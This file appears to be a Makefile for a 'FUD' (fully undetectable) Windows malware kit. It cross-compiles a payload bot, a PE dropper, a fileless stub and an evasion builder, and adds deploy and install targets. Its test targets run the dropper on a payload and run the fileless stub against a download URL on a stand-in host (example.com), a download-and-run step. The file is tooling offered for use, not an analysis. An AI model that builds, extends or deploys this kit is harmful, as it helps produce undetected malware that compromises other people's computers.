# ===============================================================================
# MinGW FUD System Makefile
# Cross-platform build system for the complete FUD ecosystem
# ===============================================================================

# Compiler settings
CXX = i686-w64-mingw32-g++
ASM = i686-w64-mingw32-as
WINDRES = i686-w64-mingw32-windres

# Compiler flags
CXXFLAGS = -std=c++17 -O2 -static-libgcc -static-libstdc++ -static -m32
ASMFLAGS = --32
LDFLAGS = -static -s -m32

# Windows libraries
LIBS = -lwininet -lcrypt32 -lpsapi -limagehlp -ladvapi32 -lkernel32 -luser32 -lshell32 -lntdll

# Directories
SRCDIR = .
BUILDDIR = build
OBJDIR = $(BUILDDIR)/obj
BINDIR = $(BUILDDIR)/bin

# Source files
CORE_MASM_SRC = core_masm_bot/core_payload.c
PE_BUILDER_SRC = pe_builder/pe_dropper.cpp
STUB_GENERATOR_SRC = stub_generator/fileless_stub.cpp
ORCHESTRATOR_SRC = orchestrator/build_manager.cpp

# Object files
CORE_MASM_OBJ = $(OBJDIR)/core_payload.o
PE_BUILDER_OBJ = $(OBJDIR)/pe_dropper.o
STUB_GENERATOR_OBJ = $(OBJDIR)/fileless_stub.o
ORCHESTRATOR_OBJ = $(OBJDIR)/build_manager.o

# Target executables
CORE_MASM_EXE = $(BINDIR)/core_payload.exe
PE_BUILDER_EXE = $(BINDIR)/pe_dropper.exe
STUB_GENERATOR_EXE = $(BINDIR)/fileless_stub.exe
ORCHESTRATOR_EXE = $(BINDIR)/fud_builder.exe

# All targets
ALL_TARGETS = $(CORE_MASM_EXE) $(PE_BUILDER_EXE) $(STUB_GENERATOR_EXE) $(ORCHESTRATOR_EXE)

# Default target
all: setup $(ALL_TARGETS)
	@echo "==============================================================================="
	@echo "FUD System Build Complete!"
	@echo "==============================================================================="
	@echo "Core MASM Bot:     $(CORE_MASM_EXE)"
	@echo "PE Builder:        $(PE_BUILDER_EXE)"
	@echo "Stub Generator:    $(STUB_GENERATOR_EXE)"
	@echo "Orchestrator:      $(ORCHESTRATOR_EXE)"
	@echo "==============================================================================="

# Setup build directories
setup:
	@mkdir -p $(OBJDIR)
	@mkdir -p $(BINDIR)

# Core MASM Bot (C version)
$(CORE_MASM_EXE): $(CORE_MASM_OBJ)
	@echo "Linking Core MASM Bot..."
	$(CXX) $(LDFLAGS) -o $@ $< $(LIBS)

$(CORE_MASM_OBJ): $(CORE_MASM_SRC)
	@echo "Compiling Core MASM Bot..."
	$(CXX) $(CXXFLAGS) -c -o $@ $<

# PE Builder
$(PE_BUILDER_EXE): $(PE_BUILDER_OBJ)
	@echo "Linking PE Builder..."
	$(CXX) $(LDFLAGS) -o $@ $< $(LIBS)

$(PE_BUILDER_OBJ): $(PE_BUILDER_SRC)
	@echo "Compiling PE Builder..."
	$(CXX) $(CXXFLAGS) -c -o $@ $<

# Stub Generator
$(STUB_GENERATOR_EXE): $(STUB_GENERATOR_OBJ)
	@echo "Linking Stub Generator..."
	$(CXX) $(LDFLAGS) -o $@ $< $(LIBS)

$(STUB_GENERATOR_OBJ): $(STUB_GENERATOR_SRC)
	@echo "Compiling Stub Generator..."
	$(CXX) $(CXXFLAGS) -c -o $@ $<

# Orchestrator
$(ORCHESTRATOR_EXE): $(ORCHESTRATOR_OBJ)
	@echo "Linking Orchestrator..."
	$(CXX) $(LDFLAGS) -o $@ $< $(LIBS)

$(ORCHESTRATOR_OBJ): $(ORCHESTRATOR_SRC)
	@echo "Compiling Orchestrator..."
	$(CXX) $(CXXFLAGS) -c -o $@ $<

# Individual build targets
core: setup $(CORE_MASM_EXE)
	@echo "Core MASM Bot built: $(CORE_MASM_EXE)"

pe: setup $(PE_BUILDER_EXE)
	@echo "PE Builder built: $(PE_BUILDER_EXE)"

stub: setup $(STUB_GENERATOR_EXE)
	@echo "Stub Generator built: $(STUB_GENERATOR_EXE)"

orchestrator: setup $(ORCHESTRATOR_EXE)
	@echo "Orchestrator built: $(ORCHESTRATOR_EXE)"

# Testing targets
test: all
	@echo "Running test suite..."
	@echo "Testing PE Builder..."
	cd $(BINDIR) && wine ./pe_dropper.exe --test
	@echo "Testing Stub Generator..."
	cd $(BINDIR) && wine ./fileless_stub.exe --test
	@echo "Testing Orchestrator..."
	cd $(BINDIR) && wine ./fud_builder.exe --test

# Quick test builds
test-pe: pe
	@echo "Quick testing PE Builder..."
	cd $(BINDIR) && wine ./pe_dropper.exe calc.exe payload.exe

test-stub: stub
	@echo "Quick testing Stub Generator..."
	cd $(BINDIR) && wine ./fileless_stub.exe --url https://example.com/test.exe

test-orchestrator: orchestrator
	@echo "Quick testing Orchestrator..."
	cd $(BINDIR) && wine ./fud_builder.exe --randomize

# Deployment targets
deploy: all
	@echo "Creating deployment package..."
	@mkdir -p deploy
	@cp $(ALL_TARGETS) deploy/
	@cp README.md deploy/ 2>/dev/null || true
	@echo "Deployment package ready in deploy/"

# Cross-compilation targets
windows-x64: setup
	$(MAKE) all CXX=x86_64-w64-mingw32-g++ ASM=x86_64-w64-mingw32-as

windows-x86: setup
	$(MAKE) all CXX=i686-w64-mingw32-g++ ASM=i686-w64-mingw32-as

# Development targets
debug: CXXFLAGS += -g -DDEBUG -O0
debug: LDFLAGS = -static
debug: all

release: CXXFLAGS += -DNDEBUG -O3 -flto
release: LDFLAGS += -flto
release: all

# Utility targets
clean:
	@echo "Cleaning build files..."
	@rm -rf $(BUILDDIR)
	@rm -rf deploy
	@echo "Clean complete."

rebuild: clean all

install: all
	@echo "Installing FUD System..."
	@mkdir -p /opt/fud-system
	@cp -r $(BINDIR)/* /opt/fud-system/
	@echo "Installation complete. Run with: /opt/fud-system/fud_builder.exe"

uninstall:
	@echo "Uninstalling FUD System..."
	@rm -rf /opt/fud-system
	@echo "Uninstall complete."

# Help target
help:
	@echo "FUD System Build System"
	@echo "======================="
	@echo ""
	@echo "Targets:"
	@echo "  all          - Build everything"
	@echo "  core         - Build Core MASM Bot only"
	@echo "  pe           - Build PE Builder only"
	@echo "  stub         - Build Stub Generator only"
	@echo "  orchestrator - Build Orchestrator only"
	@echo ""
	@echo "Testing:"
	@echo "  test         - Run full test suite"
	@echo "  test-pe      - Quick test PE Builder"
	@echo "  test-stub    - Quick test Stub Generator"
	@echo "  test-orchestrator - Quick test Orchestrator"
	@echo ""
	@echo "Deployment:"
	@echo "  deploy       - Create deployment package"
	@echo "  debug        - Build with debug symbols"
	@echo "  release      - Build optimized release"
	@echo ""
	@echo "Cross-compilation:"
	@echo "  windows-x64  - Build for Windows x64"
	@echo "  windows-x86  - Build for Windows x86"
	@echo ""
	@echo "Utilities:"
	@echo "  clean        - Remove build files"
	@echo "  rebuild      - Clean and build"
	@echo "  install      - Install to system"
	@echo "  uninstall    - Remove from system"
	@echo "  help         - Show this help"

# Check MinGW installation
check-mingw:
	@echo "Checking MinGW installation..."
	@which $(CXX) > /dev/null && echo "✓ MinGW C++ compiler found" || echo "✗ MinGW C++ compiler not found"
	@which $(ASM) > /dev/null && echo "✓ MinGW assembler found" || echo "✗ MinGW assembler not found"
	@which $(WINDRES) > /dev/null && echo "✓ MinGW resource compiler found" || echo "✗ MinGW resource compiler not found"
	@which wine > /dev/null && echo "✓ Wine found for testing" || echo "✗ Wine not found (testing disabled)"

# Phony targets
.PHONY: all setup core pe stub orchestrator test test-pe test-stub test-orchestrator deploy windows-x64 windows-x86 debug release clean rebuild install uninstall help check-mingw

# ===============================================================================
# Advanced build configurations
# ===============================================================================

# Static builds (no dependencies)
static: LDFLAGS += -static
static: all

# Minimal builds (no debug info, stripped)
minimal: CXXFLAGS += -Os -ffunction-sections -fdata-sections
minimal: LDFLAGS += -Wl,--gc-sections -Wl,--strip-all
minimal: all

# Paranoid builds (maximum security flags)
paranoid: CXXFLAGS += -fstack-protector-all -D_FORTIFY_SOURCE=2 -fPIE
paranoid: LDFLAGS += -pie -Wl,-z,relro -Wl,-z,now
paranoid: all